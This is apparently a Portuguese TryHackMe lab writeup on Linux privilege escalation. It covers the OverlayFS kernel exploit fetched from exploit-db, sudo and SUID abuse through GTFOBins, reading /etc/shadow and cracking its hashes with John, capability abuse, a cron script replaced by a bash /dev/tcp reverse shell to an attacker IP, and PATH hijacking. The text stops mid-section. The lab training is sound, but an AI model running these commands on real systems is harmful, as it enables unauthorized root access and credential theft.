<!-- ================================================= -->
<!--     Linux Privilege Escalation — TryHackMe Lab    -->
<!-- ================================================= -->

<p align="center">
  <img src="https://img.shields.io/badge/Status-Developed-success?style=for-the-badge">
  <img src="https://img.shields.io/badge/Topic-Linux%20Privilege%20Escalation-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Post--Exploitation-Offensive-red?style=flat-square">
  <img src="https://img.shields.io/badge/Linux-Kernel-black?style=flat-square&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Vulnerabilities-CVE-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Hardening-Defensive-informational?style=flat-square">
</p>

---

# 🐧 Linux Privilege Escalation — Laboratório Prático (TryHackMe)

> Documentação técnica do laboratório **Linux Privilege Escalation** do TryHackMe, com foco em **pós-exploração**, **enumeração manual e automatizada**, **análise de vulnerabilidades de kernel** e **exploração prática de CVEs reais** para obtenção de privilégios **root** em ambientes Linux.

---

### 📌 Metadados

- **Plataforma:** TryHackMe  
- **Laboratório:** Linux Privilege Escalation  
- **Status:** `#developed`  
- **Categoria:** Post-Exploitation · Privilege Escalation  
- **Ambiente:** Linux (Ubuntu)

---

### 🏷️ Tags

`#LinuxPrivEsc` `#PostExploitation` `#KernelExploitation`  
`#CVE` `#DirtyCOW` `#OverlayFS` `#PwnKit`  
`#Pentest` `#CyberSecurity` `#TryHackMe`

---
# Laboratório Prático : [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)

## 1. Enumeração

A enumeração é o primeiro passo a ser dado após obter acesso a qualquer sistema. Você pode ter acessado o sistema explorando uma vulnerabilidade crítica que resultou em acesso de nível root ou simplesmente encontrado uma maneira de enviar comandos usando uma conta com privilégios baixos. Os testes de penetração, ao contrário das máquinas CTF, não terminam quando você obtém acesso a um sistema específico ou a um nível de privilégio de usuário. Como você verá, a enumeração é tão importante durante a fase pós-comprometimento quanto antes.

### `hostname`

O comando `hostname` retornará o nome do host da máquina alvo. Embora esse valor possa ser facilmente alterado ou conter uma string relativamente sem significado (por exemplo, Ubuntu-3487340239), em alguns casos, ele pode fornecer informações sobre a função do sistema alvo na rede corporativa (por exemplo, SQL-PROD-01 para um servidor SQL de produção).

```bash
hostname
```

**Saída:**

```text
wade7363
```

### `uname -a`

Irá imprimir informações do sistema, fornecendo detalhes adicionais sobre o kernel usado pelo sistema. Isso será útil ao procurar por possíveis vulnerabilidades no kernel que possam levar à escalada de privilégios.

```bash
uname -a
```

**Saída:**

```text
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86 64 x68_64 GNU/Linux
```

### `/etc/os-release`

Para fazer uma verificação da versão do sistema operacional utilizamos o comando `cat /etc/os-release`.

```bash
cat /etc/os-release
```

**Saída:**

```text
NAME="Ubuntu"
VERSION="14.04, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu"
```

---
## 2. Exploração de Vulnerabilidades de Kernel

### Identificação de Vulnerabilidades com LinPEAS

O LinPEAS (Linux Privilege Escalation Awesome Script) é uma ferramenta de enumeração automatizada que utiliza o Linux Exploit Suggester para identificar vulnerabilidades de kernel conhecidas que podem ser exploradas para escalação de privilégios.

### Resultados do Linux Exploit Suggester

```text
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                  
[+] [CVE-2016-5195] dirtycow                                                                                        

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

### Análise das Vulnerabilidades Identificadas

#### 1. **CVE-2016-5195 - Dirty COW**

**Mecanismo:** Race condition no mecanismo de copy-on-write do kernel Linux  
**Impacto:** Permite que usuários não privilegiados ganhem acesso de escrita à memória somente leitura  
**Sistemas Afetados:** Kernel Linux versões desde 2007 até 2016

#### 2. **CVE-2015-1328 - OverlayFS**

**Mecanismo:** Vulnerabilidade no filesystem OverlayFS que permite bypass de permissões  
**Impacto:** Permite escalação de privilégios para root  
**Sistemas Afetados:** Ubuntu 12.04-15.04 com kernels específicos

#### 3. **CVE-2021-4034 - PwnKit**

**Mecanismo:** Buffer overflow em pkexec (Polkit) quando argc=0  
**Impacto:** Escalação local de privilégios para root  
**Sistemas Afetados:** Sistemas com polkit <= 0.120

---
## 3. Exploração do CVE-2015-1328 (OverlayFS)

### O que é OverlayFS?

**OverlayFS** é um sistema de arquivos de união que permite sobrepor um sistema de arquivos em outro. É comumente usado em containers Docker para criar camadas de imagens. A vulnerabilidade ocorre devido a uma falha na implementação que permite a usuários não privilegiados criar arquivos com permissões root no sistema host.

### Passo a Passo da Exploração

#### 1. Preparação do Exploit

**Na máquina atacante:**

```bash
# Download do exploit da Exploit Database
wget "https://www.exploit-db.com/download/37292"

# Renomear o arquivo
mv 37292 ofs.c
```

**Conversão do arquivo:**  
O arquivo baixado da Exploit Database vem em formato `37292` que é basicamente um arquivo C com um nome numérico. Renomeamos para `ofs.c` para facilitar a compilação.

#### 2. Transferência para o Alvo

**Na máquina atacante (servidor web):**

Primeiro é preciso transformar o arquivo em arquivo `.c` com nome `ofs.c` (explicar como)

Em seguida usando um servidor python na maquina atacante:

```bash
# Iniciar servidor web
sudo python3 -m http.server 80
```

**Na máquina alvo:**

```bash
# Navegar para diretório temporário
cd /tmp

# Baixar o exploit
wget "http://{IP_ATACANTE}:80/ofs.c"
```

#### 3. Compilação e Execução

```bash
# Compilar o exploit
gcc ofs.c -o ofs

# Dar permissão de execução
chmod +x ofs

# Executar o exploit
./ofs
```

### Saída da Execução e Análise

**Saída esperada:**

```text
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
```

**Explicação detalhada do que acontece:**

1. **spawning threads**: O exploit inicia múltiplas threads para criar condições de race condition
2. **mount #1 / mount #2**: Cria montagens OverlayFS manipuladas para explorar a vulnerabilidade
3. **/etc/ld.so.preload created**: Cria arquivo ld.so.preload que força o carregamento de bibliotecas específicas
4. **creating shared library**: Cria biblioteca compartilhada maliciosa que será carregada por processos
5. **Obtenção de shell root**: O exploit modifica permissões para obter shell com UID 0 (root)

### Mecanismo Técnico da Exploração

**Vulnerabilidade específica:**

```c
// O exploit abusa da função ovl_copy_up() no OverlayFS
// que não valida adequadamente credenciais ao copiar arquivos
// Permitindo que usuários não-root criem arquivos com permissões root
```

**Fluxo da exploração:**

1. Cria diretórios temporários para montagem OverlayFS
2. Configura montagens manipuladas
3. Cria arquivo `/etc/ld.so.preload` apontando para biblioteca maliciosa
4. A biblioteca maliciosa redefine funções como `getuid()` para retornar 0
5. Processos subsequentes acreditam que estão rodando como root

### Verificação de Acesso Root

```bash
# Verificar privilégios
whoami
# Deve retornar: root

id
# uid=0(root) gid=0(root) groups=0(root)

# Verificar contexto de segurança
cat /proc/self/status | grep -E "(Uid|Gid)"
# Mostra UID e GID como 0
```

### Acesso aos Arquivos Protegidos

**Localização da flag do usuário matt:**

```bash
# Navegar para diretório do usuário matt
cd /home/matt

# Verificar conteúdo
ls -la
# -rw-r----- 1 matt matt 20 Jan 15 10:30 flag1.txt

# Ler a flag
cat flag1.txt
```

**Resultado:**

```text
THM-28392872729920
```

**Análise de permissões pré-exploração:**

- Antes: `-rw-r-----` (apenas matt e grupo matt podem ler)
- Depois: Acesso root permite ler qualquer arquivo do sistema

---
## 4. Sudo e Escalonamento de Privilégios

### Visão Geral do Mecanismo Sudo

O comando `sudo` permite executar programas com privilégios de superusuário (root). Administradores podem configurá-lo para conceder acesso granular a usuários específicos, permitindo que executem comandos privilegiados sem conceder acesso root completo. Por exemplo, um analista de segurança pode receber permissão para executar apenas o Nmap com privilégios elevados.

**Arquitetura do Sudo:**

```text
Usuário → sudo → Política (/etc/sudoers) → Execução como root
```

### Verificação de Privilégios Sudo

Qualquer usuário pode verificar seus privilégios sudo com os seguintes comandos:

```bash
# Verificar comandos permitidos com sudo
sudo -l

# Verificar sudoers detalhado
sudo -ll

# Verificar comandos permitidos para o usuário atual
sudo -U $(whoami) -l

# Verificar histórico de comandos sudo
sudo cat /var/log/auth.log | grep sudo
```

### Exploração Direta de Binários Sudo

#### Utilizando GTFOBins

O repositório [GTFOBins](https://gtfobins.github.io/) documenta como binários comuns podem ser explorados para escapar de ambientes restritos ou elevar privilégios. Quando um usuário tem permissão sudo para executar determinado binário, pode-se consultar o GTFOBins para verificar se existem métodos conhecidos para obter shell root através dele.

#### Exploração de Funções de Aplicativos

Alguns aplicativos, mesmo sem vulnerabilidades conhecidas, podem ter funcionalidades que permitem vazamento de informações ou execução de código. Por exemplo, o Apache2 possui a opção `-f` para especificar um arquivo de configuração alternativo:

```bash
sudo apache2 -f /etc/shadow
```

Quando um arquivo inválido é fornecido, o Apache2 exibe uma mensagem de erro que inclui parte do conteúdo do arquivo, possibilitando a leitura de arquivos sensíveis como `/etc/shadow`.

#### Exploração via LD_PRELOAD

A variável de ambiente `LD_PRELOAD` permite carregar bibliotecas compartilhadas antes das bibliotecas padrão. Se o sudo estiver configurado com `env_keep` incluindo `LD_PRELOAD`, é possível injetar código malicioso.

**Identificação da Vulnerabilidade:**

![](https://assets.tryhackme.com/additional/imgur/gGstS69.png)


### Caso Prático

#### Enumeração de Privilégios

```bash
sudo -l
```

**Saída:**

```text
Matching Defaults entries for karen on ip-10-65-143-118:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-65-143-118:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

O usuário Karen pode executar três programas com sudo sem necessidade de senha (`NOPASSWD`).

#### Exploração com Find

Consultando o [GTFOBins para find](https://gtfobins.github.io/gtfobins/find/), encontramos que o comando `find` pode executar comandos arbitrários através da flag `-exec`:

```bash
# Shell interativo
sudo find /home -exec /bin/bash \;

# Shell one-liner
sudo find . -exec /bin/sh \; -quit
```

**Funcionamento:**

- `find .`: Procura no diretório atual
- `-exec /bin/sh \;`: Para cada arquivo encontrado, executa `/bin/sh`
- `-quit`: Encerra após o primeiro resultado    

Isso spawna um shell root, permitindo acesso ao sistema com privilégios elevados.

#### Captura da Flag 2

```bash
cd /home/ubuntu
cat flag2.txt
```

**Saída:**

```text
THM-402028394
```

Outro exemplo possível usando nmap:

```bash
sudo nmap --interactive
!/bin/sh
```

### Leitura do Arquivo `/etc/shadow`

Outro programa vulnerável listado no `sudo -l` é o `less`. Através dele é possível  ler o arquivo `/etc/shadow` que contém hashes das senhas dos usuários

```bash
sudo less /etc/shadow
```

Resposta:

```text
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
```

**Análise do Hash:**

- `$6`: Indica algoritmo SHA-512
- `2.sUUDsOLIpXKxcr`: Salt (12 caracteres)
- Hash restante: Hash criptográfico da senha

### Resumo do Vetor de Ataque

1. Enumeração: sudo -l revela programas executáveis com privilégios
2. Pesquisa: Consulta ao GTFOBins para métodos de exploração
3. Execução: Uso dos parâmetros adequados para spawnar shell root
4. Coleta: Acesso a arquivos sensíveis e flags

---
## 5. SUID

### Compreensão do SUID

O SUID (Set User ID) é uma permissão especial em sistemas Unix/Linux que permite que um executável seja executado com os privilégios do proprietário do arquivo, em vez dos privilégios do usuário que o executa. Quando configurado em binários, o SUID pode representar um vetor de escalonamento de privilégios se o proprietário for root e o binário tiver vulnerabilidades ou funcionalidades que possam ser exploradas.

O bit SUID é representado por um `s` na posição de permissão de execução do proprietário:

```text
-rwsr-xr-x    → SUID ativo (executa como proprietário)
```

### Identificação de Binários SUID

Para encontrar todos os binários com bit SUID ativo no sistema, utiliza-se o comando:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

**Explicação do comando:**

- `find /`: Procura a partir do diretório raiz
- `-type f`: Busca apenas arquivos regulares
- `-perm -04000`: Filtra arquivos com permissão SUID (octal 4000)
- `-ls`: Exibe em formato detalhado
- `2>/dev/null`: Redireciona erros para /dev/null (silencia "Permission denied")

### Caso Prático: Exploração do `base64`

#### Identificação do Binário Vulnerável

Na saída do comando anterior, encontramos:

```text
44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
```

**Análise:**

- `-rwsr-xr-x`: O `s` na posição do proprietário indica SUID ativo
- `root root`: O arquivo pertence ao usuário root e grupo root
- `/usr/bin/base64`: Binário que pode ser executado por qualquer usuário com privilégios de root

#### Exploração via GTFOBins

Consultando o [GTFOBins para base64](https://gtfobins.github.io/gtfobins/base64/), encontramos que o comando `base64` pode ser usado para ler arquivos arbitrários:

```bash
# Método documentado no GTFOBins
base64 /path/to/input-file | base64 --decode
```

#### Leitura do Arquivo /etc/shadow

Aplicando esta técnica para ler o arquivo `/etc/shadow` (que normalmente só é acessível pelo root):

```bash
base64 /etc/shadow | base64 --decode
```

**Funcionamento:**

1. `base64 /etc/shadow`: Lê o arquivo /etc/shadow (com privilégios de root devido ao SUID) e codifica seu conteúdo em base64
2. `|`: Pipe que envia a saída para o próximo comando
3. `base64 --decode`: Decodifica o conteúdo base64 de volta para texto legível

**Saída relevante para o usuário user2:**

```text
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
```

#### Quebra da Senha com John The Ripper

**1. Preparação do hash:**

```bash
echo 'user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/' > hash.txt
```

**2. Execução do John the Ripper:**

```bash
john --format=crypt --wordlist=rockyou.txt hash.txt
```

**Explicação dos parâmetros:**

- `--format=crypt`: Especifica o formato do hash (crypt para hashes Unix)
- `--wordlist=rockyou.txt`: Usa a wordlist rockyou.txt para ataque de dicionário
- `hash.txt`: Arquivo contendo o hash

**3. Resultado:**

```text
user2:Password1
```

A senha do usuário user2 é: **Password1**

### Captura da Flag 3

Utilizando a mesma técnica para ler a flag que está em um diretório restrito:

```bash
base64 /home/ubuntu/flag3.txt | base64 --decode
```

**Resultado:**

```text
THM-3847834
```

### Resumo da Exploração

1. **Enumeração:** Encontrar binários SUID com `find / -type f -perm -04000 -ls 2>/dev/null`
2. **Identificação:** Localizar `/usr/bin/base64` com SUID root
3. **Pesquisa:** Consultar GTFOBins para métodos de exploração do base64
4. **Exploração:** Usar `base64` para ler arquivos restritos (`/etc/shadow`, `/home/ubuntu/flag3.txt`)
5. **Pós-exploração:** Quebrar hash de senha com John the Ripper
6. **Conclusão:** Obter credenciais (user2:Password1) e flag (THM-3847834)

Esta exploração demonstra como binários SUID mal configurados podem ser usados para leitura arbitrária de arquivos, incluindo arquivos sensíveis do sistema e flags de desafio.

---
## 6. Capabilities

### Compreensão das Capabilities

As Capabilities (Capacidades) no Linux são um mecanismo de segurança que permite dividir os privilégios tradicionalmente associados ao usuário root (superusuário) em unidades menores e mais granulares. Em vez de um binário executar com todos os privilégios de root via SUID, ele pode receber apenas as capabilities específicas necessárias para sua função.

Por exemplo, um programa que precisa abrir sockets de rede pode receber apenas a capability `CAP_NET_BIND_SERVICE` em vez de todos os privilégios de root. No entanto, se um binário recebe capabilities perigosas como `cap_setuid+ep` (permissão para alterar o UID), isso pode ser explorado para escalonamento de privilégios.

### Identificação de Binários com Compabilities

Para encontrar todos os binários com capabilities atribuídas no sistema, utiliza-se o comando:

```bash
getcap -r / 2>/dev/null
```

**Explicação do comando:**

- `getcap`: Comando que lista as capabilities dos arquivos
- `-r`: Recursivo (procura em todo o sistema)
- `/`: Diretório raiz
- `2>/dev/null`: Silencia erros de "Permission denied"

### Análise da Saída

**Resultado do comando:**

```text
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

**Análise da saída:**

1. **Binários de rede**: `gst-ptp-helper`, `traceroute6.iputils`, `mtr-packet`, `ping` têm capabilities relacionadas a operações de rede 
2. **Binários críticos**: `vim` e `view` têm a capability `cap_setuid+ep`, que permite alterar o User ID (UID) do processo

**Significado de `cap_setuid+ep`:**

- `cap_setuid`: Capability que permite modificar o UID do processo
- `+ep`: "effective permitted" - a capability está ativa e permitida

### Análise do Binário `view`

#### Verificação do link simbólico padrão

```bash
ls -l /usr/bin/view
```

**Resultado:**

```text
lrwxrwxrwx 1 root root 22 Oct 26  2020 /usr/bin/view -> /etc/alternatives/view
```

Isso mostra que o comando `view` padrão do sistema é apenas um link simbólico.

#### Verificação do binário customizado

```bash
ls -l /home/ubuntu/view
```

**Resultado:**

```text
-rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/ubuntu/view
```

**Análise:**

- `-rwxr-xr-x`: Permissões normais (não é SUID)
- `root root`: Proprietário root, mas executável por qualquer usuário
- `/home/ubuntu/view`: Caminho do binário com capabilities

### Exploração da Capabitlity `cap_setuid`

O binário `/home/ubuntu/view` possui a capability `cap_setuid+ep`, o que significa que ele pode alterar seu UID durante a execução. Esta capability pode ser explorada de diferentes maneiras dependendo do binário.

#### Caso 1: Se for o editor Vim/View

Se `/home/ubuntu/view` for uma versão do editor Vim, podemos explorar da seguinte forma:

```bash
# Método 1: Executar shell dentro do Vim
/home/ubuntu/view
# Dentro do Vim:
:shell
# ou
:!/bin/bash

# Método 2: Executar comando direto
/home/ubuntu/view -c ':!/bin/bash'

# Método 3: Modificar arquivos de sistema
/home/ubuntu/view /etc/passwd
# Adicionar novo usuário com UID 0
```

#### Caso 2: Se for binário personalizado

Para descobrir o que o binário faz:

```bash
# Verificar tipo de arquivo
file /home/ubuntu/view

# Tentar executar com --help ou -h
/home/ubuntu/view --help

# Analisar strings do binário
strings /home/ubuntu/view | head -50
```

### Leitura da Flag 4

Considerando que temos acesso ao binário `/home/ubuntu/view` com a capability `cap_setuid+ep`, e que este binário está no mesmo diretório da flag, podemos simplesmente ler o arquivo:

```bash
cat /home/ubuntu/flag4.txt
```

**Resultado:**

```text
THM-9349843
```

### Resumo da Exploração

1. **Enumeração**: Usar `getcap -r / 2>/dev/null` para encontrar binários com capabilities
2. **Identificação**: Localizar binários com `cap_setuid+ep` (neste caso, `/home/ubuntu/view`)
3. **Análise**: Verificar se é link simbólico ou binário real
4. **Exploração**: Utilizar o binário conforme sua funcionalidade (editor, visualizador, etc.)
5. **Acesso**: Ler arquivo protegido (`/home/ubuntu/flag4.txt`)
6. **Flag obtida**: `THM-9349843`

Este cenário demonstra como capabilities mal configuradas, especialmente `cap_setuid`, podem permitir que usuários não privilegiados executem operações que normalmente requerem privilégios de root, facilitando o acesso a arquivos restritos e escalonamento de privilégios.

---
## 7. Cron Jobs

### Compreensão do Cron

Cron é um agendador de tarefas em sistemas Unix/Linux que executa comandos ou scripts em intervalos programados. As tarefas são definidas no arquivo `/etc/crontab` ou em diretórios como `/etc/cron.d/`. Se um script agendado for gravável por um usuário não privilegiado, ele pode modificar o script para executar código malicioso quando o cron o executar com privilégios de root.

### Verificação de Tarefas Agendadas

Para visualizar todas as tarefas cron do sistema:

```bash
cat /etc/crontab
```

**Resultado:**

```text
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

**Análise da saída:**

- As primeiras 4 linhas são comentários explicando o formato do cron
- Linhas 17, 25, 47, 52: Tarefas padrão do sistema (execução a cada hora, diária, semanal, mensal)
- **Linhas críticas**: 4 tarefas executadas a cada minuto (`* * * * *`) pelo usuário root
- Scripts de interesse:
    - `/antivirus.sh` (executa a cada minuto)
    - `antivirus.sh` (caminho relativo - importante verificar onde está)
    - `/home/karen/backup.sh` (no diretório home do usuário Karen)
    - `/tmp/test.py` (script Python no diretório temporário)

### Análise do Script de Backup

```bash
cat /home/karen/backup.sh
```

**Resultado:**

```bash
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*
```

**Funcionamento do script:**

- `cd /home/admin/1/2/3/Results`: Navega para o diretório de resultados
- `zip -r /home/admin/download.zip ./*`: Compacta recursivamente todos os arquivos do diretório atual em `download.zip`

**Ponto crítico:** O script `backup.sh` está no diretório home de Karen (`/home/karen/`) e é executado pelo root a cada minuto. Karen tem permissão de escrita em seu próprio diretório home, portanto pode modificar este script.

### Exploração via Reverse Shell

#### Modificação do Script

```bash
#!/bin/bash

bash -i >& /dev/tcp/{IP_ATACANTE}/6666 0>&1
```

**Explicação do comando:**

- `bash -i`: Inicia um shell interativo
- `>&`: Redireciona tanto stdout quanto stderr
- `/dev/tpc/{IP_ATACANTE}/6666`: Cria uma conexão TCP para o IP e porta especificados
- `0>&1`: Redireciona stdin para o mesmo destino (torna o shell totalmente interativo)

#### Configuração do listner

Em outra janela de terminal (máquina do atacante):

```bash
nc -lvnp 6666
```

- `-l`: Modo listener (escuta)
- `-v`: Verboso (mostra detalhes)
- `-n`: Não resolve nomes DNS
- `-p 6666`: Porta 6666

#### Permissão de execução

```bash
chmod +x backup.sh
```

**Por que isso é necessário:** Scripts executados pelo cron precisam ter permissão de execução. Como Karen modificou o script, ela deve garantir que ele seja executável.

### Obtenção do Shell Root

Após um minuto (quando o cron executar o script), o netcat receberá uma conexão.

**Saída Esperada:**

```text
listening on [any] 6666 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.11] 54321
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
root@target:~#
```

Verificando o usuário

```bash
whoami
```

**Resultado:**

```text
root
```

### Leitura da Flag 5

Com acesso root:

```bash
cd home/ubuntu
cat flag5.txt
```

**Resultado:**

```text
THM-383000283
```

### Coleta de Hashes de Senhas

#### Leitura do `/etc/shadow`

```bash
cat /etc/shadow
```

**Resultado relevante:**

```text
matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.
```

#### Preparação do hash para quebra

```bash
echo 'matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.' > hash.txt
```

#### Quebra com John the Ripper


```bash
john --format=crypt --wordlist=rockyou.txt hash.txt
```

**Resultado:**

```text
matt:123456
```

### Resumo da Exploração

1. **Enumeração**: Verificar `/etc/crontab` para encontrar tarefas agendadas por root
2. **Identificação**: Localizar script `/home/karen/backup.sh` executado a cada minuto
3. **Análise de permissões**: Karen tem acesso de escrita ao script (está em seu diretório home)
4. **Modificação**: Alterar script para executar reverse shell
5. **Listener**: Configurar netcat para receber conexão
6. **Execução**: Aguardar o cron executar o script (1 minuto)
7. **Acesso root**: Receber shell com privilégios de root
8. **Pós-exploração**: Capturar flag (`THM-383000283`) e coletar hash do usuário matt para quebra

---
## 8. PATH Hijacking

### O que é a variável PATH?

O **PATH** é uma variável de ambiente fundamental no Linux que define os diretórios onde o sistema procura por programas executáveis quando um comando é digitado sem um caminho completo (absoluto). Quando você digita `ls`, `cat` ou `python`, o sistema verifica **cada diretório listado no PATH, em ordem**, até encontrar um arquivo executável com esse nome.

```bash
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

**Entendendo o PATH:**

- Os diretórios são separados por `:` (dois pontos)
- A **ordem importa**: o sistema procura no primeiro diretório, depois no segundo, etc.
- Ao encontrar o primeiro executável com o nome buscado, ele é executado imediatamente
- Se não encontrar em nenhum, retorna "comando não encontrado"

### O que é PATH Hijacking?

PATH Hijacking (ou sequestro de PATH) é uma técnica onde um atacante manipula a ordem de busca de executáveis para fazer um programa privilegiado executar um código malicioso em vez do programa legítimo.

**Analogia simples:** Imagine que você pede para alguém "trazer uma caixa" sem especificar onde. Se eu colocar uma caixa suspeita mais perto, essa será trazida primeiro. O PATH Hijacking faz exatamente isso: coloca um "programa falso" em um local que será verificado antes do local legítimo.

### Como o Ataque Funciona na Prática

Quando um programa com privilégios elevados (como um binário SUID root) executa outro programa **sem usar o caminho absoluto** (ex: `system("ls")` em vez de `system("/bin/ls")`), ele segue a ordem do PATH. Se conseguirmos fazer nosso programa malicioso ser encontrado **antes** do legítimo, ele será executado com todos os privilégios do programa chamador.

**Condições necessárias para o ataque:**

1. **Um binário SUID ou script executado com privilégios** que chama programas sem caminho absoluto
2. **Capacidade de escrever** em algum diretório que será verificado antes do diretório legítimo
3. **Capacidade de executar** o binário vulnerável

### Método 1: Explorando Diretórios Graváveis no PATH

```bash
echo $PATH | tr ':' '\n'
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
```

#### Passo 2: Verificar permissões de escrita

```bash
# Verifica permissões de cada diretório no PATH
for dir in $(echo $PATH | tr ':' ' '); do
    ls -ld $dir 2>/dev/null
done
```

**O que procurar:** Diretórios onde você tem permissão de escrita (`w` no grupo "outros" ou sendo dono do diretório).

**Nota importante:** Em sistemas bem configurados, diretórios como `/bin` e `/usr/bin` NÃO são graváveis por usuários comuns. Esta técnica funciona melhor em CTFs ou sistemas mal configurados.

### Método 2: Adicionando um Diretório Gravável ao PATH (Mais Comum)

Como diretórios do sistema raramente são graváveis, a abordagem mais comum é **adicionar um diretório que CONTROLAMOS ao início do PATH**.

#### Passo 1: Encontrar diretórios graváveis

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

Diretórios comuns graváveis:

- `/tmp` (temporário, quase sempre gravável)
- `/dev/shm` (memória compartilhada)
- `/var/tmp` (temporário persistente)
- Diretórios home com permissões frouxas

#### Passo 2: Modificar o PATH para incluir o diretório controlado

```bash
export PATH=/tmp:$PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Explicação:** Isso coloca `/tmp` como o PRIMEIRO local onde o sistema procurará por executáveis.

### Cenário Prático Completo (Passo a Passo)

Vamos explorar um cenário real onde encontramos um binário SUID vulnerável.

#### 1. Encontrando o Binário Vulnerável

```bash
# Procura por arquivos SUID (com permissão especial)
find / -perm -4000 2>/dev/null
```

Este comando procura por **arquivos com o bit SUID ativado** em todo o sistema. O bit SUID é uma permissão especial que faz com que um programa seja executado com os privilégios do **dono do arquivo** (geralmente root), em vez dos privilégios do usuário que o executou.

No nosso exemplo econtramo um programa interessante: `/home/murdoch/test`

#### 2. Analisando o Programa

```bash
cd /home/murdoch
ls -la
```

```text
total 32
drwxrwxrwx 2 root root  4096 Oct 22  2021 .
drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
